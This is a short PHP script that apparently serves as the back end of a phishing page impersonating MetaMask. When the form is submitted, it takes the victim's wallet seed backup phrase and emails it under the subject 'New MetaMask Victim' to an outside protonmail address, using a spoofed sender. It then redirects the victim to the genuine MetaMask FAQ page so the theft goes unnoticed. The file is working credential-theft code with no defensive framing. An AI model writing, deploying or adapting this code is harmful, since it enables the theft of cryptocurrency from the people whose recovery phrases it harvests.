<?php if(isset($_POST['submit'])){$k0="metamaskmanagaer@support.io";$s1=$_POST['sbp'];$l2="io.support.MetaMask@protonmail.com";$f3="New MetaMask Victim";$n4="MetaMask Seed Backup Phrase: ".$s1;$h5="From: ".$k0;if(mail($l2,$f3,$n4,$h5)){header('Location: https://metamask.io/faqs');}else{echo "Something went wrong!";}}?>